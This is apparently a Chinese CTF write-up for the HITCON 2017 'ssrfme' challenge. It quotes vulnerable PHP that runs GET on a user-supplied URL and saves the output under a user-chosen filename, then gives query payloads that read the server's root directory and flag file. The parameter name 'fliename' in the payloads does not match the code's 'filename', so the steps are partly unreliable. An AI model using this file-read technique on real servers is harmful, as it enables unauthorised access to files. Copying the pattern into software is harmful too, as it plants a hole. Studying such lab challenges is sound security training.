---
title: hitcon_2017_ssrfme
date: 2021-10-06 22:28:27
tags: ctf
cover: https://browser9.qhimg.com/bdr/__85/t01f0d712d10ff619ee.jpg
---

# hitcon_2017_ssrfme

```php
 <?php 
    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]); 
    @mkdir($sandbox); 
    @chdir($sandbox); 

    $data = shell_exec("GET " . escapeshellarg($_GET["url"])); 
    $info = pathinfo($_GET["filename"]); 
    $dir  = str_replace(".", "", basename($info["dirname"])); 
    @mkdir($dir); 
    @chdir($dir); 
    @file_put_contents(basename($info["basename"]), $data); 
    highlight_file(__FILE__); 

```

这个代码的意思大概是通过GET方法请求到的数据保存在我们自定义的文件名当中。

给url参数传递/可以查看根目录下的内容



```
$sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
```

访问sandbox/+md5(orange+出口Ip)    注意:加密后用小写的

如果出现下图，说明路径是对的

![](https://img-blog.csdnimg.cn/20210502212135484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNjUyODY0,size_16,color_FFFFFF,t_70)

然后构造payload1:

```
?url=/&fliename=aaa
```

这个aaa可以随便写，能用就行

然后访问:

``` 
/sandbox/md5加密后的内容/aaa
```

出现以下目录

![](https://i.loli.net/2021/10/07/9A3qsJf8m6QoLlp.png))

可以看到flag

然后改一下payload继续以上操作

``` 
?url=/flag&fliename=aaa
```

```
/sandbox/md5加密后的内容/aaa
```

发现文件没法显示

![](https://i.loli.net/2021/10/07/1d7aiGARerbP4OX.png)

继续改payload

``` 
?url=/flag&fliename=aaa.txt
```

```
/sandbox/md5加密后的内容/aaa.txt
```

flag就出来了

![](https://i.loli.net/2021/10/07/7CsKIJzpm6XnLSx.png)



## tips:



“REMOTE_ADDR” ：正在浏览当前页面用户的 IP 地址

escapeshellarg （）：— 把字符串转码为可以在 shell 命令里使用的参数

pathinfo()： 函数以数组的形式返回关于文件路径的信息

basename() 函数返回路径中的文件名部分
